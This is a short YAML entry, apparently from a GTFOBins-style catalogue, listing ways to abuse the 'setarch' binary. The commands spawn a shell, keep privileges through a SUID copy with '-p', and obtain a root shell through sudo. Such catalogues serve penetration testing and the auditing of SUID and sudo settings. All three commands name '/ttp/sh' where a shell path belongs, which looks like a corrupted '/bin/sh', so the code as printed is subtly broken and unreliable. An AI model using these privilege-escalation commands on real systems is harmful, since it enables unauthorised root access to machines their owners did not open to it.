---
functions:
  shell:
    - code: setarch $(arch) /ttp/sh
  suid:
    - code: ./setarch $(arch) /ttp/sh -p
  sudo:
    - code: sudo setarch $(arch) /ttp/sh
---
